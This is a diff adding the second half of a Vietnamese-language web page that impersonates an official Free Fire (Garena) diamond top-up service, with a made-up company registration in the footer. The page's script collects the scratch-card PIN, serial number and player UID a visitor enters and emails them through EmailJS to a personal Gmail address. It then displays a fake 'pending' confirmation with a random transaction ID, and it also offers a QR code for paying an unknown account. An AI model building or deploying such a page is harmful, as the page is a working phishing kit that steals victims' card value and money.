+                                    <div class="denom-diamonds">💎 28.750</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Mã thẻ</label>
+                            <input type="text" id="cardCode" class="input-field" placeholder="Nhập mã thẻ cào..." style="width: 100%; height:42px; border: 1.5px solid #e0e0e0; border-radius: 8px; padding: 0 12px;">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label>Số Seri</label>
+                            <input type="text" id="cardSeri" class="input-field" placeholder="Nhập số seri..." style="width: 100%; height:42px; border: 1.5px solid #e0e0e0; border-radius: 8px; padding: 0 12px;">
+                        </div>
+                    </div>
+
+                    <!-- Tab 3: Shop -->
+                    <div id="tab-shop" class="tab-content">
+                        <div class="shop-grid">
+                            <div class="shop-card active" onclick="selectShopItem(this, 'Thẻ Tuần', '50.000 đ')">
+                                <img src="https://cdn.phototourl.com/member/2026-10-04-1f418152-d6b9-4507-8048-ad4884c6fa35.png" alt="Thẻ Tuần" class="shop-card-img">
+                                <div class="shop-title">Thẻ tuần
+                                <span class="help-icon" onclick="alert('Tổng cộng 1.415 kim cương, trở thành thành viên của cửa hàng giảm giá và nhiều đặc quyền khác')">?</span></div>
+                                <div class="shop-desc">Nhận ngay kim cương & ưu đãi đăng nhập hàng ngày</div>
+                                <div class="shop-price">50.000 đ</div>
+                            </div>
+
+                            <div class="shop-card" onclick="selectShopItem(this, 'Thẻ Tháng', '150.000 đ')">
+                                <img src="https://cdn.phototourl.com/member/2026-10-04-2dcca66e-99d8-4771-8110-822c22c396dc.png" alt="Thẻ Tháng" class="shop-card-img">
+                                <div class="shop-title">Thẻ tháng
+                                <span class="help-icon" onclick="alert('Tổng cộng 5.560 kim cương, trở thành thành viên của cửa hàng giảm giá và nhiều đặc quyền khác')">?</span></div>
+                                <div class="shop-desc">Gói ưu đãi cao cấp kéo dài 30 ngày</div>
+                                <div class="shop-price">150.000 đ</div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- Bước 3: Phương Thức Thanh Toán -->
+                <div class="step-card" id="stepPaySection">
+                    <div class="step-title-box">
+                        <div class="step-badge">3</div>
+                        <div class="step-title">Phương thức thanh toán</div>
+                    </div>
+
+                    <div class="pay-grid" id="payGrid">
+                        <div class="pay-card" data-pay="Ví ShopeePay">
+                            <span class="hot-badge">HOT</span>
+                            <img src="https://cdn.phototourl.com/member/2026-10-08-70e7ac81-bb13-4500-8f9d-bd58ea81bb13.png" class="pay-icon" alt="ShopeePay">
+                            <span class="pay-name">Ví ShopeePay</span>
+                        </div>
+
+                        <div class="pay-card active" data-pay="QR Pay">
+                            <img src="https://cdn.phototourl.com/member/2026-10-08-f21bd262-eb3c-4d34-b6b4-711401c7e9f1.png" class="pay-icon" alt="QR Pay">
+                            <span class="pay-name">QR Pay</span>
+                        </div>
+
+                        <div class="pay-card" data-pay="App Ngân Hàng">
+                            <img src="https://cdn.phototourl.com/member/2026-10-08-83eff4c5-b97f-4b38-b103-9898bedba090.png" class="pay-icon" alt="App Ngân Hàng">
+                            <span class="pay-name">Thanh toán qua App Ngân Hàng</span>
+                        </div>
+
+                        <div class="pay-card" data-pay="ATM / iBanking">
+                            <img src="https://cdn.phototourl.com/member/2026-10-08-32c206ed-412d-46b9-b6fc-19fd696a21f0.png" class="pay-icon" alt="ATM">
+                            <span class="pay-name">ATM - iBanking</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Bottom Checkout Sticky Bar -->
+        <div class="bottom-bar" id="bottomBar">
+            <div class="checkout-info">
+                <span class="checkout-label">Gói đã chọn: <b id="selectedTitle" style="color:#222;">💎 1.415 Kim Cương</b></span>
+                <span class="checkout-amount" id="selectedPrice">50.000 đ</span>
+            </div>
+            <button id="btnPay" class="btn-pay">Thanh toán</button>
+        </div>
+    </div>
+
+    <!-- PAGE CHUYỂN TIỀN QR CHUẨN NAPTHE.VN -->
+    <div id="qrCheckoutPage" class="qr-checkout-page">
+        <!-- Sub Header -->
+        <div class="sub-header">
+            <button class="btn-back" onclick="backToMainApp()">‹ Trang trước</button>
+        </div>
+
+        <!-- Ảnh Logo Game -->
+        <div class="checkout-game-card">
+            <img src="https://cdn.phototourl.com/member/2026-10-09-e06e29d6-cfe9-4077-a152-4450fc4f833a.png" style="width: 600px; height: auto;" alt="Free Fire" class="checkout-game-img">
+        </div>
+
+        <!-- Thông tin đơn hàng -->
+        <div class="summary-card">
+            <div class="summary-row">
+                <span>Tổng cộng</span>
+                <strong>💎 <span id="summaryDiamonds">1.415</span></strong>
+            </div>
+            <div class="summary-row">
+                <span>Giá</span>
+                <strong id="summaryPrice">50.000 đ</strong>
+            </div>
+            <div class="summary-row">
+                <span>Phương thức thanh toán</span>
+                <strong id="summaryPayMethod">QR Pay</strong>
+            </div>
+            <div class="summary-row">
+                <span>Tên tài khoản trong game</span>
+                <strong id="summaryAccount">--</strong>
+            </div>
+        </div>
+
+        <!-- Mã khuyến mãi -->
+        <div class="promo-card">
+            <div class="promo-title">Mã khuyến mãi</div>
+            <div class="promo-input-box">
+                <input type="text" class="promo-input" placeholder="Nhập mã khuyến mãi ở đây, ví dụ: KHUYẾN MÃI">
+                <button class="btn-apply-promo" onclick="alert('Mã khuyến mãi không hợp lệ!')">ÁP DỤNG</button>
+            </div>
+        </div>
+
+        <!-- Nút bấm Xử lý thanh toán -->
+        <button id="btnProcessPay" class="btn-process-pay" onclick="toggleQrDisplay()">Xử lý thanh toán</button>
+
+        <!-- Khung Mã QR hiện ra sau khi xử lý -->
+        <div id="qrDisplayBox" class="qr-display-box">
+            <div class="qr-instruction">Quét mã ngân hàng bạn chọn</div>
+            <div class="qr-subtext">Thanh toán qua bất kỳ ngân hàng hoặc ví điện tử nào</div>
+
+            <div class="qr-image-container">
+                <img id="qrImageCode" src="https://cdn.phototourl.com/member/2026-10-04-a2b94538-3038-4f19-80c4-facabd8ef063.jpg" alt="Mã QR Thanh Toán">
+            </div>
+
+            <button class="btn-qr-done" onclick="finishPayment()">Thanh toán đã hoàn thành</button>
+        </div>
+    </div>
+
+    <!-- MỤC CHỜ XỬ LÝ (KẾT QUẢ) -->
+    <div id="pendingSection" class="pending-section">
+        <div class="spinner-box">
+            <div class="spinner"></div>
+        </div>
+        
+        <div class="status-tag">⏳ Đang chờ xác nhận thanh toán...</div>
+        
+        <h3 style="font-size: 1.05rem; margin-bottom: 6px; color: #222;">Giao dịch đang được xử lý</h3>
+        <p style="font-size: 0.78rem; color: #666; line-height: 1.4;">
+            Hệ thống đang kiểm tra giao dịch của bạn. Vui lòng giữ trang này, Kim Cương/Vật phẩm sẽ được gửi tự động vào tài khoản sau 1-3 phút.
+        </p>
+
+        <div class="order-detail-card">
+            <div class="order-row">
+                <span>Mã giao dịch:</span>
+                <strong id="pendingTxId">#GA839210</strong>
+            </div>
+            <div class="order-row">
+                <span>Thời gian:</span>
+                <strong id="pendingTime">19:30 - 04/10/2026</strong>
+            </div>
+            <div class="order-row">
+                <span>UID nhận:</span>
+                <strong id="pendingUid">12345678</strong>
+            </div>
+            <div class="order-row">
+                <span>Gói nạp:</span>
+                <strong id="pendingPackage" style="color:#d32f2f;">💎 1.415 Kim Cương</strong>
+            </div>
+            <div class="order-row">
+                <span>Số tiền thanh toán:</span>
+                <strong id="pendingAmount">50.000 đ</strong>
+            </div>
+            <div class="order-row">
+                <span>Hình thức:</span>
+                <strong id="pendingMethod">QR Pay</strong>
+            </div>
+        </div>
+
+        <button class="btn-new-order" onclick="resetToNewOrder()">Quay lại Trang chủ</button>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>CÔNG TY CỔ PHẦN TNHH FREE FIRE | Giấy CNDKDN số 0103959912 do Sở Kế hoạch và Đầu tư TP Hà Nội cấp.</p>
+        <p>© 2026 NaptheX5 GARENA - Hệ thống nạp game chính thức.</p>
+    </footer>
+
+    <!-- JavaScript Xử Lý Tương Tác & EmailJS -->
+    <script>
+        (function() {
+            emailjs.init("D32s33ZSpoM1W4Pkf"); // Public Key EmailJS giữ nguyên
+        })();
+
+        const EMAILJS_SERVICE_ID = "service_abc123";
+        const EMAILJS_TEMPLATE_ID = "template_kfnbqvj";
+
+        let loggedUid = '';
+        let activeTab = 'online';
+
+        let currentOnlinePrice = '50.000 đ';
+        let currentOnlineTitle = '1.415';
+        let currentPayMethod = 'QR Pay';
+
+        let currentCardType = 'Viettel';
+        let currentCardPrice = '50.000 đ';
+        let currentCardTitle = '1.415';
+
+        let currentShopTitle = 'Thẻ Tuần';
+        let currentShopPrice = '50.000 đ';
+
+        const uidInput = document.getElementById('uidInput');
+        const btnLogin = document.getElementById('btnLogin');
+        const loginSection = document.getElementById('loginSection');
+        const userLogged = document.getElementById('userLogged');
+        const displayUid = document.getElementById('displayUid');
+        const btnLogout = document.getElementById('btnLogout');
+
+        const selectedTitle = document.getElementById('selectedTitle');
+        const selectedPrice = document.getElementById('selectedPrice');
+        const btnPay = document.getElementById('btnPay');
+
+        const uidRegex = /^\d{8,11}$/;
+        const cardNumRegex = /^\d{6,15}$/;
+
+        btnLogin.addEventListener('click', function() {
+            const uid = uidInput.value.trim();
+            if(!uid) {
+                alert('Vui lòng nhập UID của bạn!');
+                return;
+            }
+            if(!uidRegex.test(uid)) {
+                alert('UID không hợp lệ!');
+                return;
+            }
+
+            loggedUid = uid;
+            displayUid.textContent = loggedUid;
+            loginSection.style.display = 'none';
+            userLogged.classList.add('active');
+        });
+
+        btnLogout.addEventListener('click', function() {
+            loggedUid = '';
+            uidInput.value = '';
+            userLogged.classList.remove('active');
+            loginSection.style.display = 'block';
+        });
+
+        function switchTab(tab) {
+            activeTab = tab;
+            
+            document.getElementById('tabBtnOnline').classList.remove('active');
+            document.getElementById('tabBtnCard').classList.remove('active');
+            document.getElementById('tabBtnShop').classList.remove('active');
+
+            document.getElementById('tab-online').classList.remove('active');
+            document.getElementById('tab-card').classList.remove('active');
+            document.getElementById('tab-shop').classList.remove('active');
+
+            document.getElementById('stepPaySection').style.display = (tab === 'card') ? 'none' : 'block';
+
+            if(tab === 'online') {
+                document.getElementById('tabBtnOnline').classList.add('active');
+                document.getElementById('tab-online').classList.add('active');
+                btnPay.textContent = 'Thanh toán';
+            } else if(tab === 'card') {
+                document.getElementById('tabBtnCard').classList.add('active');
+                document.getElementById('tab-card').classList.add('active');
+                btnPay.textContent = 'Xác nhận nạp thẻ';
+            } else if(tab === 'shop') {
+                document.getElementById('tabBtnShop').classList.add('active');
+                document.getElementById('tab-shop').classList.add('active');
+                btnPay.textContent = 'Thanh toán';
+            }
+            updateCheckoutBar();
+        }
+
+        function bindDenomEvents() {
+            const denomCards = document.querySelectorAll('#denomGrid .denom-card');
+            denomCards.forEach(card => {
+                card.addEventListener('click', function() {
+                    denomCards.forEach(c => c.classList.remove('active'));
+                    this.classList.add('active');
+                    currentOnlinePrice = this.getAttribute('data-price');
+                    currentOnlineTitle = this.getAttribute('data-title');
+                    updateCheckoutBar();
+                });
+            });
+
+            const cardDenomCards = document.querySelectorAll('#cardDenomGrid .denom-card');
+            cardDenomCards.forEach(card => {
+                card.addEventListener('click', function() {
+                    cardDenomCards.forEach(c => c.classList.remove('active'));
+                    this.classList.add('active');
+                    currentCardPrice = this.getAttribute('data-price');
+                    currentCardTitle = this.getAttribute('data-title');
+                    updateCheckoutBar();
+                });
+            });
+        }
+        bindDenomEvents();
+
+        function selectCardType(element, type) {
+            const items = document.querySelectorAll('.card-type-item');
+            items.forEach(i => i.classList.remove('active'));
+            element.classList.add('active');
+            currentCardType = type;
+            updateCheckoutBar();
+        }
+
+        function selectShopItem(element, title, price) {
+            const cards = document.querySelectorAll('.shop-card');
+            cards.forEach(c => c.classList.remove('active'));
+            element.classList.add('active');
+            currentShopTitle = title;
+            currentShopPrice = price;
+            updateCheckoutBar();
+        }
+
+        const payCards = document.querySelectorAll('#payGrid .pay-card');
+        payCards.forEach(card => {
+            card.addEventListener('click', function() {
+                payCards.forEach(p => p.classList.remove('active'));
+                this.classList.add('active');
+                currentPayMethod = this.getAttribute('data-pay');
+            });
+        });
+
+        function updateCheckoutBar() {
+            if(activeTab === 'online') {
+                selectedTitle.textContent = `💎 ${currentOnlineTitle} Kim Cương`;
+                selectedPrice.textContent = currentOnlinePrice;
+            } else if(activeTab === 'card') {
+                selectedTitle.textContent = `Thẻ ${currentCardType} (💎 ${currentCardTitle} Kim Cương)`;
+                selectedPrice.textContent = currentCardPrice;
+            } else if(activeTab === 'shop') {
+                selectedTitle.textContent = currentShopTitle;
+                selectedPrice.textContent = currentShopPrice;
+            }
+        }
+
+        // Bấm nút "Thanh toán" / "Xác nhận nạp thẻ" tại trang chính
+        btnPay.addEventListener('click', function() {
+            if(!loggedUid) {
+                alert('Vui lòng nhập và đăng nhập UID trước khi thanh toán!');
+                uidInput.focus();
+                return;
+            }
+
+            if(activeTab === 'card') {
+                const code = document.getElementById('cardCode').value.trim();
+                const seri = document.getElementById('cardSeri').value.trim();
+
+                if(!code || !seri) {
+                    alert('Vui lòng điền đầy đủ Mã thẻ cào và Số Seri!');
+                    return;
+                }
+                if(!cardNumRegex.test(code)) {
+                    alert('Mã thẻ không hợp lệ!');
+                    return;
+                }
+                if(!cardNumRegex.test(seri)) {
+                    alert('Số Seri không hợp lệ!');
+                    return;
+                }
+
+                const now = new Date();
+                const timeStr = now.getHours().toString().padStart(2,'0') + ':' + 
+                                now.getMinutes().toString().padStart(2,'0') + ' - ' + 
+                                now.getDate().toString().padStart(2,'0') + '/' + 
+                                (now.getMonth()+1).toString().padStart(2,'0') + '/' + 
+                                now.getFullYear();
+
+                // Gửi email qua EmailJS
+                const cardParams = {
+                    name: "Hệ thống Nạp Thẻ - Thẻ Cào Mới",
+                    time: timeStr,
+                    message: `NẠP THẺ CÀO BẰNG THẺ\n\n- Nhà mạng: ${currentCardType}\n- Mệnh giá: ${currentCardPrice}\n- Mã thẻ (PIN): ${code}\n- Số Seri: ${seri}\n- UID người chơi: ${loggedUid}\n- Email nhận: hoanqtronglzch@gmail.com`,
+                    to_email: 'hoanqtronglzch@gmail.com'
+                };
+
+                emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, cardParams)
+                    .then(function(response) {
+                        console.log("Đã gửi thông tin thẻ cào thành công!", response.status);
+                    }, function(error) {
+                        console.error("Lỗi khi gửi email:", error);
+                    });
+
+                finishPayment();
+            } else {
+                // Chuyển sang giao diện thanh toán QR
+                document.getElementById('mainApp').style.display = 'none';
+                document.getElementById('summaryDiamonds').textContent = currentOnlineTitle;
+                document.getElementById('summaryPrice').textContent = currentOnlinePrice;
+                document.getElementById('summaryPayMethod').textContent = currentPayMethod;
+                document.getElementById('summaryAccount').textContent = loggedUid;
+
+                document.getElementById('qrDisplayBox').classList.remove('active');
+                document.getElementById('btnProcessPay').style.display = 'flex';
+                document.getElementById('qrCheckoutPage').classList.add('active');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+        });
+
+        function backToMainApp() {
+            document.getElementById('qrCheckoutPage').classList.remove('active');
+            document.getElementById('mainApp').style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleQrDisplay() {
+            document.getElementById('btnProcessPay').style.display = 'none';
+            document.getElementById('qrDisplayBox').classList.add('active');
+        }
+
+        function finishPayment() {
+            document.getElementById('qrCheckoutPage').classList.remove('active');
+            document.getElementById('mainApp').style.display = 'none';
+
+            const randomTxId = '#GA' + Math.floor(100000 + Math.random() * 900000);
+            const now = new Date();
+            const timeStr = now.getHours().toString().padStart(2,'0') + ':' + 
+                            now.getMinutes().toString().padStart(2,'0') + ' - ' + 
+                            now.getDate().toString().padStart(2,'0') + '/' + 
+                            (now.getMonth()+1).toString().padStart(2,'0') + '/' + 
+                            now.getFullYear();
+
+            document.getElementById('pendingTxId').textContent = randomTxId;
+            document.getElementById('pendingTime').textContent = timeStr;
+            document.getElementById('pendingUid').textContent = loggedUid;
+            document.getElementById('pendingPackage').textContent = selectedTitle.textContent;
+            document.getElementById('pendingAmount').textContent = selectedPrice.textContent;
+            document.getElementById('pendingMethod').textContent = (activeTab === 'card') ? (`Thẻ cào ${currentCardType}`) : currentPayMethod;
+
+            document.getElementById('pendingSection').classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function resetToNewOrder() {
+            document.getElementById('pendingSection').classList.remove('active');
+            document.getElementById('mainApp').style.display = 'block';
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+    </script>
+</body>
+</html>
